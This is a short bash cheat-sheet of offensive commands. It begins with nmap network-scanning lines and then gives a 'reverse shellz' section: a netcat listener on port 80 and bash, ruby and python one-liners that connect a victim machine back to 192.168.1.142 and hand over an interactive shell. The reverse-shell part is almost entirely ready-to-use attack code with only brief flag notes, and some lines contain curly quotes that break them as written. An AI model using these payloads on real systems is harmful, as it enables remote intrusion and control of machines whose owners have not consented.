#!/usr/bin/env bash

#::::::#
# nmap #
#::::::#
nmap -v -sn 192.168.1.0/24 | grep -v down
sudo nmap -sn -PS22,3389 192.168.1.0/24 #custom TCP SYN scan
sudo nmap -sn -PU161 192.168.1.0/24 #custom UDP scan

#::::::::::::::::#
# reverse shellz #
#::::::::::::::::#

# from https://hackernoon.com/reverse-shell-cf154dfee6bd

# 1) First there is a (my) machine listening somewhere on a specific tcp port. In this case using netcat
machine1: nc -vlp 80 
# -v, — verbose Set verbosity level (can be used several times); 
# -l, — listen Bind and listen for incoming connections; 
# -p, — source-port port Specify source port to use;

# 2) Then victim machine connects to listener:

  #bash
  machine2: bash -i >& /dev/tcp/192.168.1.142/80 0>&1
  
  #ruby
  ruby -rsocket -e’f=TCPSocket.open(“192.168.1.142”,80).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’
  
  #python
  python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.142”,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
